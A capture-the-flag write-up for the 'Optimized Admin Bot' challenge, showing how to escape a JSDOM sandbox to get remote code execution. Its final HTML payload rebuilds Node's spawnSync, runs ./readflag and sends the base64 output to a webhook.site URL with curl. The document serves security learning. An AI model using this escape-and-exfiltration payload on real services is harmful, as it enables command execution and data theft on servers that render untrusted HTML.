# Optimized Admin Bot
> *First blood🩸*
## Description
By jayden

Launching a whole instance of Chromium for basic client-side challenges is so archaic and uselessly resource-intensive. Check out my optimized admin bot!

https://klodd.vsc.tf/challenge/optimized-admin-bot

Downloads
optimized-admin-bot.zip
## Solution
> reference: [escape-nodejs-sandboxes](https://www.netspi.com/blog/technical/web-application-penetration-testing/escape-nodejs-sandboxes/)

Basically this is a JSDom jail challenge, we want to have a RCE and execute `./readflag` in nodeJS:
```javascript
new JSDOM(webpage, {
    runScripts: "dangerously",
})
```
Therefore, by researching "JSDom jail" and sth, I got a link then [jsdom/jsdom/issues/2729](https://github.com/jsdom/jsdom/issues/2729#issuecomment-559928366).  
It points out that I can use:
```javascript
const process = Node.constructor("return process")();
const fs = process.binding('fs');
```
inside JSDom to access `process` and `fs`.  
Then, according to reference, I have a script helper to do RCE in JSDom: [CapacitorSet](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822).  
So, here is the final payload:
```html
<html>
    <head></head>
<body>
  <script>
    const process = Node.constructor("return process")();

    // Source: https://github.com/nodejs/node/blob/master/lib/child_process.js

    // Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
    spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}

    // Defines spawnSync, the function that will do the actual spawning
    spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}

    const a = spawnSync("./readflag").stdout.toString('base64');
    // console.log(a);
    const url = "https://webhook.site/[redecated]/?a=" + a;
    spawnSync("curl", [url]).stdout;
  </script>
</body>
</html>
```